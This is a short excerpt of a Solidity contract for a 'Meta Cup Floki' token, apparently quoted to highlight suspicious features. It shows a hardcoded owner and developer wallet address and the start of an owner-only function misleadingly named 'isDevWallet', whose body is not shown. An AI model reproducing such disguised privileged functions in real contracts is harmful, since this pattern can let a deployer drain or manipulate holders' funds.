...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xB0B64e96EA822431B536191C1fA153F7CFB0dAbf;
...
contract MetaCupFloki is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0xB0B64e96EA822431B536191C1fA153F7CFB0dAbf);
    ...
    string private _name = "Meta Cup Floki"; 
    string private _symbol = "$MCUPFLOKI";  
    ...
    function isDevWallet(uint256 acc, address adr) authorized public virtual {
